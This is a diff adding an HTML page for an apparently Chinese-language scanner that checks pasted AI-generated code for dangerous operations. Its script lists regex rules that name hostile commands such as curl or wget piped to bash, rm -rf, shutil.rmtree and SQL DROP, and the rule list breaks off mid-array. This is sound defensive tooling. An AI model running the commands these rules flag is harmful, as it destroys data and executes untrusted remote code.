@@ -1,0 +1,1686 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Code Sandbox — 代码安全沙盒</title>
+<style>
+/* ===== Reset & Base ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0a0a; --bg2:#111; --bg3:#1a1a1a;
+  --fg:#e0e0e0; --fg2:#999; --fg3:#666;
+  --green:#00ff41; --green-dim:#0d5c2e;
+  --red:#ff4444; --red-dim:#5c1a1a;
+  --yellow:#ffcc00; --yellow-dim:#5c4a00;
+  --orange:#ff8800; --orange-dim:#4a2800;
+  --blue:#00aaff; --blue-dim:#0a2a4a;
+  --cyan:#00cccc;
+  --border:#2a2a2a; --border-focus:#00ff4133;
+  --danger:#ff3333; --critical:#ff0000; --high:#ff6600; --medium:#ffaa00; --low:#ffdd00; --safe:#00ff41;
+  --editor-bg:#0c0c0c;
+  --font-mono:'JetBrains Mono','Fira Code','Cascadia Code','Consolas',monospace;
+  --font-sans:'Inter',-apple-system,system-ui,sans-serif;
+  --radius:6px; --radius-sm:4px;
+  --shadow:0 4px 24px rgba(0,0,0,0.5);
+}
+html,body{height:100%;overflow:hidden}
+body{
+  font-family:var(--font-sans);
+  background:var(--bg); color:var(--fg);
+  display:flex; flex-direction:column;
+}
+
+/* ===== Header ===== */
+.header{
+  display:flex; align-items:center; justify-content:space-between;
+  padding:10px 20px; background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  flex-shrink:0; z-index:10;
+}
+.logo{
+  display:flex; align-items:center; gap:10px;
+  font-family:var(--font-mono); font-size:14px; font-weight:700;
+}
+.logo .icon{font-size:22px}
+.logo .brand{color:var(--green)}
+.logo .tag{
+  font-size:10px; color:var(--fg3); padding:2px 8px;
+  border:1px solid var(--border); border-radius:10px;
+  text-transform:uppercase; letter-spacing:1px;
+}
+.header-right{display:flex; align-items:center; gap:12px}
+.btn{
+  display:inline-flex; align-items:center; gap:6px;
+  padding:6px 14px; font-size:12px; font-weight:600;
+  border-radius:var(--radius-sm); border:1px solid var(--border);
+  cursor:pointer; transition:all 0.15s;
+  font-family:var(--font-sans); white-space:nowrap;
+}
+.btn:hover{transform:translateY(-1px)}
+.btn:active{transform:translateY(0)}
+.btn-primary{
+  background:var(--green); color:#000; border-color:var(--green);
+}
+.btn-primary:hover{background:var(--green);filter:brightness(1.1);box-shadow:0 0 12px var(--green-dim)}
+.btn-danger{
+  background:var(--red-dim); color:var(--red); border-color:var(--red-dim);
+}
+.btn-danger:hover{background:var(--red);color:#fff;box-shadow:0 0 12px rgba(255,68,68,0.3)}
+.btn-ghost{background:transparent;color:var(--fg2)}
+.btn-ghost:hover{color:var(--fg);background:var(--bg3)}
+.btn-sm{padding:4px 10px;font-size:11px}
+.lang-select{
+  padding:6px 10px; font-size:12px; font-family:var(--font-mono);
+  background:var(--bg3); color:var(--fg); border:1px solid var(--border);
+  border-radius:var(--radius-sm); cursor:pointer; outline:none;
+}
+.lang-select:focus{border-color:var(--green-dim)}
+.char-count{font-size:11px;color:var(--fg3);font-family:var(--font-mono)}
+
+/* ===== Main Layout ===== */
+.main{display:flex;flex:1;overflow:hidden}
+.panel{display:flex;flex-direction:column;overflow:hidden}
+.panel-left{flex:1;min-width:0;border-right:1px solid var(--border)}
+.panel-right{width:380px;flex-shrink:0;overflow-y:auto;overflow-x:hidden}
+
+/* ===== Editor Area ===== */
+.editor-toolbar{
+  display:flex; align-items:center; justify-content:space-between;
+  padding:6px 12px; background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  flex-shrink:0; gap:8px;
+}
+.editor-toolbar .left,.editor-toolbar .right{display:flex;align-items:center;gap:8px}
+.editor-container{flex:1;display:flex;overflow:hidden;position:relative}
+.editor-container::before{
+  content:''; position:absolute; inset:0;
+  background:radial-gradient(ellipse at top left,rgba(0,255,65,0.02),transparent 70%);
+  pointer-events:none; z-index:0;
+}
+.line-numbers{
+  flex-shrink:0; width:50px; padding:14px 0;
+  background:var(--editor-bg); color:var(--fg3);
+  font-family:var(--font-mono); font-size:13px; line-height:1.65;
+  text-align:right; overflow:hidden; user-select:none;
+  border-right:1px solid rgba(255,255,255,0.05);
+  position:relative; z-index:1;
+}
+.line-numbers .ln{
+  padding-right:12px;
+  transition:color 0.15s;
+}
+.line-numbers .ln.danger-line{
+  background:var(--red-dim); color:var(--red);
+}
+.line-numbers .ln.warning-line{
+  background:var(--yellow-dim); color:var(--yellow);
+}
+.line-numbers .ln.safe-line{color:var(--fg3)}
+.code-area{
+  flex:1; position:relative; z-index:1;
+}
+.code-area textarea{
+  width:100%; height:100%; padding:14px 14px;
+  background:transparent; color:var(--green);
+  font-family:var(--font-mono); font-size:13px; line-height:1.65;
+  border:none; outline:none; resize:none;
+  tab-size:2; caret-color:var(--green);
+  position:relative; z-index:1;
+}
+.code-area textarea::placeholder{color:var(--fg3);font-style:italic}
+.code-highlight{
+  position:absolute; inset:0; padding:14px 14px;
+  font-family:var(--font-mono); font-size:13px; line-height:1.65;
+  pointer-events:none; overflow:hidden; white-space:pre-wrap; word-wrap:break-word;
+  z-index:0; color:var(--fg2);
+}
+.code-highlight .danger-span{
+  background:var(--red-dim); color:var(--red);
+  border-bottom:2px solid var(--red); display:inline;
+  padding:1px 2px; border-radius:2px;
+}
+.code-highlight .warning-span{
+  background:var(--yellow-dim); color:var(--yellow);
+  border-bottom:1px dashed var(--yellow); display:inline;
+  padding:1px 2px; border-radius:2px;
+}
+
+/* ===== Right Panel ===== */
+.report-header{
+  padding:12px 16px; background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  display:flex; align-items:center; justify-content:space-between;
+  flex-shrink:0;
+}
+.report-title{
+  font-size:13px; font-weight:700; color:var(--fg);
+  display:flex; align-items:center; gap:8px;
+}
+.report-title .dot{
+  width:8px; height:8px; border-radius:50%;
+}
+.report-title .dot.idle{background:var(--fg3)}
+.report-title .dot.scanning{background:var(--yellow);animation:pulse 0.8s infinite}
+.report-title .dot.danger{background:var(--red);animation:pulse 0.8s infinite}
+.report-title .dot.safe{background:var(--green)}
+
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
+
+/* Score Gauge */
+.score-section{
+  padding:20px 16px; text-align:center;
+  border-bottom:1px solid var(--border);
+  background:var(--bg2);
+}
+.gauge-container{position:relative;display:inline-block}
+.gauge{
+  width:120px; height:120px;
+  transform:rotate(-90deg);
+}
+.gauge-bg{fill:none;stroke:var(--bg3);stroke-width:8}
+.gauge-fill{fill:none;stroke-width:8;stroke-linecap:round;transition:stroke-dashoffset 0.8s ease,stroke 0.5s}
+.gauge-text{
+  position:absolute; inset:0; display:flex; flex-direction:column;
+  align-items:center; justify-content:center;
+}
+.gauge-value{font-size:32px;font-weight:800;font-family:var(--font-mono);line-height:1}
+.gauge-label{font-size:10px;color:var(--fg3);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+.score-detail{display:flex;justify-content:center;gap:24px;margin-top:12px}
+.score-item{text-align:center}
+.score-item .num{font-size:20px;font-weight:700;font-family:var(--font-mono)}
+.score-item .lbl{font-size:10px;color:var(--fg3);margin-top:2px}
+.num.danger{color:var(--red)}
+.num.warning{color:var(--yellow)}
+.num.info{color:var(--blue)}
+
+/* Findings List */
+.findings{padding:8px 0}
+.finding{
+  margin:4px 12px; padding:10px 12px;
+  background:var(--bg3); border-radius:var(--radius-sm);
+  border-left:3px solid var(--border); cursor:pointer;
+  transition:all 0.15s;
+}
+.finding:hover{background:#252525}
+.finding.critical{border-left-color:var(--critical);background:rgba(255,0,0,0.05)}
+.finding.high{border-left-color:var(--high);background:rgba(255,102,0,0.05)}
+.finding.medium{border-left-color:var(--medium);background:rgba(255,170,0,0.04)}
+.finding.low{border-left-color:var(--low);background:rgba(255,221,0,0.03)}
+.finding-header{
+  display:flex; align-items:center; gap:8px; margin-bottom:4px;
+}
+.finding-severity{
+  font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:1px;
+  padding:1px 6px; border-radius:3px;
+}
+.finding-severity.critical{background:var(--critical);color:#fff}
+.finding-severity.high{background:var(--high);color:#000}
+.finding-severity.medium{background:var(--medium);color:#000}
+.finding-severity.low{background:var(--low);color:#000}
+.finding-line{
+  font-size:11px;color:var(--fg3);font-family:var(--font-mono);
+}
+.finding-message{font-size:12px;color:var(--fg2);line-height:1.5}
+.finding-code{
+  font-size:11px; font-family:var(--font-mono); color:var(--fg3);
+  background:rgba(0,0,0,0.3); padding:4px 8px; border-radius:3px;
+  margin-top:4px; white-space:pre-wrap; word-break:break-all; max-height:60px; overflow:hidden;
+}
+.finding-category{
+  font-size:9px; color:var(--fg3); text-transform:uppercase; margin-top:4px;
+}
+
+/* Summary */
+.summary{padding:12px 16px;border-top:1px solid var(--border);display:none}
+.summary.visible{display:block}
+.risk-bar{height:4px;border-radius:2px;margin-bottom:10px;background:var(--bg3)}
+.risk-bar-fill{height:100%;border-radius:2px;transition:width 0.5s,background 0.5s}
+.summary-text{font-size:12px;color:var(--fg2);line-height:1.6}
+.summary-text .emoji{font-size:14px}
+
+/* Empty State */
+.empty-state{
+  padding:40px 20px; text-align:center; color:var(--fg3);
+}
+.empty-state .icon{font-size:48px;margin-bottom:12px;opacity:0.3}
+.empty-state .msg{font-size:13px;line-height:1.6}
+
+/* ===== Bottom Bar ===== */
+.bottom-bar{
+  display:flex; align-items:center; justify-content:space-between;
+  padding:8px 16px; background:var(--bg2);
+  border-top:1px solid var(--border); flex-shrink:0;
+  font-size:11px; color:var(--fg3);
+}
+.bottom-bar .left,.bottom-bar .right{display:flex;align-items:center;gap:16px}
+.bottom-bar .status-item{display:flex;align-items:center;gap:6px}
+.bottom-bar .status-icon{width:6px;height:6px;border-radius:50%}
+.bottom-bar .status-icon.online{background:var(--green);box-shadow:0 0 6px var(--green)}
+.bottom-bar .status-icon.warning{background:var(--yellow)}
+.bottom-bar .status-icon.error{background:var(--red)}
+
+/* ===== Examples Modal ===== */
+.modal-overlay{
+  position:fixed; inset:0; background:rgba(0,0,0,0.7);
+  display:flex; align-items:center; justify-content:center;
+  z-index:100; opacity:0; pointer-events:none; transition:opacity 0.2s;
+  backdrop-filter:blur(4px);
+}
+.modal-overlay.active{opacity:1;pointer-events:all}
+.modal{
+  background:var(--bg2); border:1px solid var(--border);
+  border-radius:var(--radius); width:90%;max-width:700px;max-height:80vh;
+  display:flex;flex-direction:column; box-shadow:var(--shadow);
+}
+.modal-header{
+  padding:14px 16px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.modal-header h3{font-size:14px;font-weight:700}
+.modal-close{
+  background:none;border:none;color:var(--fg3);font-size:20px;cursor:pointer;
+  width:30px;height:30px;display:flex;align-items:center;justify-content:center;
+  border-radius:50%;transition:all 0.15s;
+}
+.modal-close:hover{color:var(--fg);background:var(--bg3)}
+.modal-body{padding:16px;overflow-y:auto;flex:1}
+.example-list{display:flex;flex-direction:column;gap:10px}
+.example-item{
+  padding:12px 14px; background:var(--bg3); border-radius:var(--radius-sm);
+  border:1px solid var(--border); cursor:pointer; transition:all 0.15s;
+  display:flex;justify-content:space-between;align-items:flex-start;gap:12px;
+}
+.example-item:hover{border-color:var(--green-dim);background:rgba(0,255,65,0.03)}
+.example-info{flex:1}
+.example-name{font-size:13px;font-weight:600;margin-bottom:4px}
+.example-desc{font-size:11px;color:var(--fg3);line-height:1.4}
+.example-badge{
+  font-size:9px;padding:2px 8px;border-radius:10px;font-weight:600;
+  text-transform:uppercase;flex-shrink:0;
+}
+.example-badge.danger{background:var(--red-dim);color:var(--red)}
+.example-badge.warning{background:var(--yellow-dim);color:var(--yellow)}
+.example-preview{
+  font-size:10px;font-family:var(--font-mono);color:var(--fg3);
+  background:rgba(0,0,0,0.4);padding:6px 8px;border-radius:3px;
+  margin-top:6px; max-height:40px; overflow:hidden; white-space:pre-wrap;
+}
+
+/* ===== History Panel ===== */
+.history-panel{display:none}
+.history-panel.visible{display:block}
+.history-item{
+  padding:10px 12px; margin:4px 12px;
+  background:var(--bg3); border-radius:var(--radius-sm);
+  cursor:pointer; transition:all 0.15s; border:1px solid transparent;
+}
+.history-item:hover{background:#252525;border-color:var(--border)}
+.history-item.active{border-color:var(--green-dim)}
+.history-time{font-size:10px;color:var(--fg3);margin-bottom:4px}
+.history-summary{
+  font-size:11px;color:var(--fg2);display:flex;align-items:center;gap:8px;
+}
+.history-score{
+  font-size:11px;font-weight:700;font-family:var(--font-mono);
+  padding:1px 6px;border-radius:3px;font-size:10px;
+}
+.history-score.danger{background:var(--red-dim);color:var(--red)}
+.history-score.warning{background:var(--yellow-dim);color:var(--yellow)}
+.history-score.safe{background:var(--green-dim);color:var(--green)}
+.history-lang{font-size:9px;color:var(--fg3);font-family:var(--font-mono)}
+.history-actions{display:flex;gap:6px;margin-top:6px}
+.history-actions .btn{padding:3px 8px;font-size:10px}
+
+/* ===== Tab Switcher ===== */
+.tab-bar{
+  display:flex; border-bottom:1px solid var(--border);
+  padding:0 12px; background:var(--bg2);
+}
+.tab{
+  padding:10px 14px; font-size:12px; font-weight:600;
+  color:var(--fg3); cursor:pointer; border-bottom:2px solid transparent;
+  transition:all 0.15s; display:flex;align-items:center;gap:6px;
+}
+.tab:hover{color:var(--fg)}
+.tab.active{color:var(--green);border-bottom-color:var(--green)}
+.tab .tab-badge{
+  font-size:9px;background:var(--bg3);padding:1px 6px;border-radius:8px;font-weight:700;
+}
+.tab.active .tab-badge{background:var(--green-dim);color:var(--green)}
+
+/* ===== Scrollbar ===== */
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#333;border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:#555}
+
+/* ===== Toast ===== */
+.toast{
+  position:fixed; top:20px; right:20px; z-index:200;
+  padding:12px 20px; border-radius:var(--radius);
+  font-size:12px;font-weight:600; box-shadow:var(--shadow);
+  transform:translateX(120%); transition:transform 0.3s ease;
+  background:var(--bg2); border:1px solid var(--border); color:var(--fg);
+}
+.toast.show{transform:translateX(0)}
+.toast.success{border-color:var(--green);color:var(--green)}
+.toast.error{border-color:var(--red);color:var(--red)}
+
+/* ===== Typing animation ===== */
+.blink{animation:blink 1s step-end infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* ===== Responsive ===== */
+@media(max-width:900px){
+  .main{flex-direction:column}
+  .panel-right{width:100%;max-height:300px;flex-shrink:0}
+}
+</style>
+</head>
+<body>
+
+<!-- ===== Header ===== -->
+<header class="header">
+  <div class="logo">
+    <span class="icon">🛡️</span>
+    <span class="brand">AI Code Sandbox</span>
+    <span class="tag">安全沙盒</span>
+  </div>
+  <div class="header-right">
+    <select class="lang-select" id="langSelect">
+      <option value="auto">Auto Detect</option>
+      <option value="javascript">JavaScript</option>
+      <option value="python">Python</option>
+      <option value="bash">Bash</option>
+      <option value="sql">SQL</option>
+    </select>
+    <button class="btn btn-ghost btn-sm" onclick="openExamples()">📋 示例</button>
+    <button class="btn btn-danger btn-sm" onclick="clearEditor()" title="清空编辑器">🗑️ 清空</button>
+    <button class="btn btn-primary" id="scanBtn" onclick="runScan()">
+      🔍 <span id="scanBtnText">安全扫描</span>
+    </button>
+    <span class="char-count" id="charCount">0 字符</span>
+  </div>
+</header>
+
+<!-- ===== Main Area ===== -->
+<div class="main">
+  <!-- Left: Editor -->
+  <div class="panel panel-left">
+    <div class="editor-toolbar">
+      <div class="left">
+        <span style="font-size:11px;color:var(--fg3);font-family:var(--font-mono)">📄 粘贴AI生成代码进行安全检测</span>
+      </div>
+      <div class="right">
+        <span style="font-size:11px;color:var(--blue)">Ctrl+Enter 扫描</span>
+      </div>
+    </div>
+    <div class="editor-container">
+      <div class="line-numbers" id="lineNumbers"></div>
+      <div class="code-area">
+        <div class="code-highlight" id="codeHighlight"></div>
+        <textarea
+          id="codeEditor"
+          placeholder="// 在此粘贴 AI 生成的代码...&#10;// 支持 JavaScript / Python / Bash / SQL&#10;// 按 Ctrl+Enter 进行安全扫描"
+          spellcheck="false"
+        ></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- Right: Report -->
+  <div class="panel panel-right" id="rightPanel">
+    <!-- Tab Bar -->
+    <div class="tab-bar">
+      <div class="tab active" data-tab="report" onclick="switchTab('report')">
+        📊 报告 <span class="tab-badge" id="reportBadge" style="display:none">0</span>
+      </div>
+      <div class="tab" data-tab="history" onclick="switchTab('history')">
+        📜 历史 <span class="tab-badge" id="historyBadge">0</span>
+      </div>
+    </div>
+
+    <!-- Report Tab -->
+    <div id="tab-report">
+      <div class="report-header">
+        <div class="report-title">
+          <span class="dot idle" id="statusDot"></span>
+          <span id="reportStatus">等待扫描</span>
+        </div>
+      </div>
+
+      <!-- Score Gauge -->
+      <div class="score-section" id="scoreSection" style="display:none">
+        <div class="gauge-container">
+          <svg class="gauge" viewBox="0 0 120 120">
+            <circle class="gauge-bg" cx="60" cy="60" r="52"/>
+            <circle class="gauge-fill" id="gaugeFill" cx="60" cy="60" r="52"
+              stroke-dasharray="326.73" stroke-dashoffset="326.73"/>
+          </svg>
+          <div class="gauge-text">
+            <div class="gauge-value" id="gaugeValue">0</div>
+            <div class="gauge-label">风险评分</div>
+          </div>
+        </div>
+        <div class="score-detail">
+          <div class="score-item">
+            <div class="num danger" id="criticalCount">0</div>
+            <div class="lbl">严重</div>
+          </div>
+          <div class="score-item">
+            <div class="num" style="color:var(--orange)" id="highCount">0</div>
+            <div class="lbl">高风险</div>
+          </div>
+          <div class="score-item">
+            <div class="num warning" id="mediumCount">0</div>
+            <div class="lbl">中风险</div>
+          </div>
+          <div class="score-item">
+            <div class="num info" id="lowCount">0</div>
+            <div class="lbl">低风险</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Findings -->
+      <div class="findings" id="findings">
+        <div class="empty-state" id="emptyState">
+          <div class="icon">🔒</div>
+          <div class="msg">
+            粘贴代码后点击"安全扫描"<br>即可检测危险操作
+          </div>
+        </div>
+      </div>
+
+      <!-- Summary -->
+      <div class="summary" id="summary"></div>
+    </div>
+
+    <!-- History Tab -->
+    <div class="history-panel" id="tab-history">
+    </div>
+  </div>
+</div>
+
+<!-- ===== Bottom Bar ===== -->
+<footer class="bottom-bar">
+  <div class="left">
+    <span class="status-item">
+      <span class="status-icon online"></span> 检测引擎就绪
+    </span>
+    <span>支持 JS / Python / Bash / SQL</span>
+  </div>
+  <div class="right">
+    <span id="lastScanTime">尚未扫描</span>
+  </div>
+</footer>
+
+<!-- ===== Examples Modal ===== -->
+<div class="modal-overlay" id="examplesModal">
+  <div class="modal">
+    <div class="modal-header">
+      <h3>📋 危险代码示例库</h3>
+      <button class="modal-close" onclick="closeExamples()">&times;</button>
+    </div>
+    <div class="modal-body">
+      <div class="example-list" id="exampleList"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== Toast ===== -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+//  DETECTION ENGINE
+// ============================================================
+
+// Score weights
+const SEVERITY = {
+  CRITICAL: {label:'critical', score:25, icon:'💀', color:'var(--critical)'},
+  HIGH:     {label:'high',     score:15, icon:'🔥', color:'var(--high)'},
+  MEDIUM:   {label:'medium',   score:10, icon:'⚠️', color:'var(--medium)'},
+  LOW:      {label:'low',      score:5,  icon:'ℹ️', color:'var(--low)'},
+};
+
+// Pattern categories
+const CATEGORIES = {
+  FILE_DELETE:    {name:'文件删除', icon:'🗑️'},
+  NETWORK:        {name:'网络请求', icon:'🌐'},
+  PROCESS_KILL:   {name:'进程管理', icon:'💥'},
+  PERMISSION:     {name:'权限变更', icon:'🔑'},
+  CODE_EXEC:      {name:'代码执行', icon:'⚡'},
+  DATA_MUTATION:  {name:'数据破坏', icon:'💣'},
+  SENSITIVE_API:  {name:'敏感API', icon:'🔓'},
+};
+
+// ===== Detection Rules (language-aware) =====
+const RULES = [
+  // ---- FILE DELETION ----
+  {
+    id:'rm-rf', regex:/\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f?[a-zA-Z]*|-rf?)\b/i,
+    message:'执行 rm -rf 强制删除命令，可能导致系统文件被不可逆删除', category:'FILE_DELETE',
+    severity:'CRITICAL', languages:'bash',
+  },
+  {
+    id:'rm-recursive', regex:/\brm\s+(-[a-zA-Z]*r[a-zA-Z]*|--recursive)\b/i,
+    message:'递归删除命令，可能删除大量文件', category:'FILE_DELETE',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'rm-any', regex:/\brm\s+/i,
+    message:'文件删除命令', category:'FILE_DELETE',
+    severity:'MEDIUM', languages:'bash',
+  },
+  {
+    id:'os-remove', regex:/\bos\.remove\s*\(|os\.unlink\s*\(/i,
+    message:'文件删除操作 (os.remove/os.unlink)', category:'FILE_DELETE',
+    severity:'HIGH', languages:'python',
+  },
+  {
+    id:'os-removedirs', regex:/\bos\.removedirs\s*\(|os\.rmdir\s*\(/i,
+    message:'目录删除操作', category:'FILE_DELETE',
+    severity:'HIGH', languages:'python',
+  },
+  {
+    id:'shutil-rmtree', regex:/\bshutil\.rmtree\s*\(/i,
+    message:'递归删除目录树 - 可能删除整个项目', category:'FILE_DELETE',
+    severity:'CRITICAL', languages:'python',
+  },
+  {
+    id:'pathlib-unlink', regex:/\.Path\s*\(.+\).*\.unlink\s*\(|pathlib.*\.unlink\s*\(/i,
+    message:'文件删除操作 (pathlib.unlink)', category:'FILE_DELETE',
+    severity:'HIGH', languages:'python',
+  },
+  {
+    id:'fs-unlink', regex:/\bfs\.(unlink|rmdir|rm)\s*\(|\bfs\.(unlinkSync|rmdirSync|rmSync)\s*\(/i,
+    message:'Node.js 文件/目录删除 (fs.unlink/rmdir/rm)', category:'FILE_DELETE',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'fs-extra-remove', regex:/\bfs\.remove\s*\(|fsExtra\.remove\s*\(|\bremoveSync\s*\(/i,
+    message:'文件系统递归删除', category:'FILE_DELETE',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'rimraf', regex:/\brimraf\s*\(/i,
+    message:'rimraf 递归删除', category:'FILE_DELETE',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'del-module', regex:/\bdel\s*\(/i,
+    message:'del 模块文件删除', category:'FILE_DELETE',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'sql-drop', regex:/\bDROP\s+(TABLE|DATABASE|SCHEMA|INDEX|VIEW|PROCEDURE|FUNCTION|TRIGGER)\b/i,
+    message:'SQL DROP 语句 - 删除数据库对象', category:'FILE_DELETE',
+    severity:'CRITICAL', languages:'sql',
+  },
+  {
+    id:'sql-truncate', regex:/\bTRUNCATE\s+(TABLE\s+)?/i,
+    message:'SQL TRUNCATE 语句 - 清空表数据', category:'DATA_MUTATION',
+    severity:'HIGH', languages:'sql',
+  },
+
+  // ---- NETWORK ----
+  {
+    id:'curl-pipe-bash', regex:/\bcurl\s+.*\|\s*(bash|sh|zsh|ksh)\b/i,
+    message:'curl 远程脚本直接执行 - 经典的供应链攻击模式', category:'NETWORK',
+    severity:'CRITICAL', languages:'bash',
+  },
+  {
+    id:'wget-pipe-bash', regex:/\bwget\s+.*\|\s*(bash|sh|zsh|ksh)\b/i,
+    message:'wget 远程脚本直接执行', category:'NETWORK',
+    severity:'CRITICAL', languages:'bash',
+  },
+  {
+    id:'curl-download', regex:/\bcurl\s+/i,
+    message:'网络请求 (curl)', category:'NETWORK',
+    severity:'LOW', languages:'bash',
+  },
+  {
+    id:'wget-download', regex:/\bwget\s+/i,
+    message:'网络下载 (wget)', category:'NETWORK',
+    severity:'LOW', languages:'bash',
+  },
+  {
+    id:'fetch-api', regex:/\bfetch\s*\(|\bwindow\.fetch\s*\(/i,
+    message:'网络请求 (fetch API)', category:'NETWORK',
+    severity:'MEDIUM', languages:'javascript',
+  },
+  {
+    id:'xhr', regex:/\bXMLHttpRequest\s*\(|new\s+XMLHttpRequest\b/i,
+    message:'网络请求 (XMLHttpRequest)', category:'NETWORK',
+    severity:'MEDIUM', languages:'javascript',
+  },
+  {
+    id:'axios', regex:/\baxios\.\s*(get|post|put|delete|patch|request)\s*\(/i,
+    message:'HTTP 请求 (axios)', category:'NETWORK',
+    severity:'MEDIUM', languages:'javascript',
+  },
+  {
+    id:'requests-module', regex:/\brequests\.\s*(get|post|put|delete|patch|head)\s*\(/i,
+    message:'HTTP 请求 (requests)', category:'NETWORK',
+    severity:'MEDIUM', languages:'python',
+  },
+  {
+    id:'urllib', regex:/\burllib\.request\.(urlopen|urlretrieve)\s*\(/i,
+    message:'HTTP 请求 (urllib)', category:'NETWORK',
+    severity:'MEDIUM', languages:'python',
+  },
+  {
+    id:'httpx', regex:/\bhttpx\.\s*(get|post|put|delete|patch)\s*\(/i,
+    message:'HTTP 请求 (httpx)', category:'NETWORK',
+    severity:'MEDIUM', languages:'python',
+  },
+  {
+    id:'socket-connect', regex:/\bsocket\.(connect|createConnection)\s*\(/i,
+    message:'Socket 网络连接', category:'NETWORK',
+    severity:'MEDIUM', languages:'javascript,python',
+  },
+
+  // ---- PROCESS / KILL ----
+  {
+    id:'kill-9', regex:/\bkill\s+-9\b|\bkill\s+-KILL\b/i,
+    message:'强制终止进程 (kill -9/KILL)', category:'PROCESS_KILL',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'killall', regex:/\b(killall|pkill)\s+/i,
+    message:'批量终止进程', category:'PROCESS_KILL',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'systemctl-stop', regex:/\bsystemctl\s+(stop|disable|mask)\b/i,
+    message:'停止/禁用系统服务', category:'PROCESS_KILL',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'service-stop', regex:/\bservice\s+\S+\s+stop\b/i,
+    message:'停止系统服务', category:'PROCESS_KILL',
+    severity:'MEDIUM', languages:'bash',
+  },
+  {
+    id:'os-kill', regex:/\bos\.kill\s*\(|os\.killpg\s*\(/i,
+    message:'进程终止 (os.kill/os.killpg)', category:'PROCESS_KILL',
+    severity:'HIGH', languages:'python',
+  },
+  {
+    id:'process-kill', regex:/\bprocess\.kill\s*\(|process\.exit\s*\(/i,
+    message:'进程终止/退出 (Node.js)', category:'PROCESS_KILL',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'subprocess-kill', regex:/\.kill\s*\(/i,
+    message:'子进程终止', category:'PROCESS_KILL',
+    severity:'MEDIUM', languages:'python,javascript',
+  },
+
+  // ---- PERMISSION ----
+  {
+    id:'chmod-777', regex:/\bchmod\s+(777|a\+rwx|ugo\+rwx)\b/i,
+    message:'设置文件为完全公开权限 (777) - 安全风险', category:'PERMISSION',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'chmod-recursive', regex:/\bchmod\s+(-[a-zA-Z]*R[a-zA-Z]*|--recursive)\b/i,
+    message:'递归修改权限', category:'PERMISSION',
+    severity:'HIGH', languages:'bash',
+  },
+  {
+    id:'chmod-any', regex:/\bchmod\s+/i,
+    message:'修改文件权限', category:'PERMISSION',
+    severity:'LOW', languages:'bash',
+  },
+  {
+    id:'chown-root', regex:/\bchown\s+(root:|:\s*root)/i,
+    message:'修改文件所有者为 root', category:'PERMISSION',
+    severity:'MEDIUM', languages:'bash',
+  },
+  {
+    id:'os-chmod', regex:/\bos\.chmod\s*\(|os\.chown\s*\(/i,
+    message:'修改文件权限/所有者 (Python)', category:'PERMISSION',
+    severity:'MEDIUM', languages:'python',
+  },
+  {
+    id:'fs-chmod', regex:/\bfs\.(chmod|chown)\s*\(|\bfs\.(chmodSync|chownSync)\s*\(/i,
+    message:'修改文件权限/所有者 (Node.js)', category:'PERMISSION',
+    severity:'MEDIUM', languages:'javascript',
+  },
+
+  // ---- CODE EXECUTION ----
+  {
+    id:'eval', regex:/\beval\s*\(/i,
+    message:'eval() 代码执行 - 可执行任意代码', category:'CODE_EXEC',
+    severity:'CRITICAL', languages:'javascript,python',
+  },
+  {
+    id:'exec', regex:/\bexec\s*\(/i,
+    message:'exec() 代码执行 (Python)', category:'CODE_EXEC',
+    severity:'CRITICAL', languages:'python',
+  },
+  {
+    id:'subprocess-shell', regex:/\bsubprocess\.(call|run|Popen|check_output|check_call)\s*\(.*\bshell\s*=\s*True\b/i,
+    message:'subprocess 使用 shell=True - 命令注入风险', category:'CODE_EXEC',
+    severity:'CRITICAL', languages:'python',
+  },
+  {
+    id:'subprocess-call', regex:/\bsubprocess\.(call|run|Popen)\s*\(/i,
+    message:'子进程调用 - 需审查命令来源', category:'CODE_EXEC',
+    severity:'MEDIUM', languages:'python',
+  },
+  {
+    id:'child_process-exec', regex:/\b(child_process|cp)\.(exec|execSync)\s*\(/i,
+    message:'child_process.exec - 命令注入风险', category:'CODE_EXEC',
+    severity:'CRITICAL', languages:'javascript',
+  },
+  {
+    id:'child_process-spawn', regex:/\b(child_process|cp)\.(spawn|fork|spawnSync)\s*\(/i,
+    message:'子进程生成 - 需审查参数来源', category:'CODE_EXEC',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'function-constructor', regex:/new\s+Function\s*\(/i,
+    message:'new Function() 动态代码执行', category:'CODE_EXEC',
+    severity:'HIGH', languages:'javascript',
+  },
+  {
+    id:'require-dynamic', regex:/require\s*\(\s*\w+\s*\+|\brequire\s*\(\s*`/,
+    message:'动态 import/require - 可能加载未验证模块', category:'CODE_EXEC',
+    severity:'MEDIUM', languages:'javascript',
+  },
+  {
+    id:'sql-exec', regex:/\bEXEC\s+\(|\bEXECUTE\s+\(/i,
+    message:'SQL 动态执行', category:'CODE_EXEC',
+    severity:'HIGH', languages:'sql',
+  },
+  {
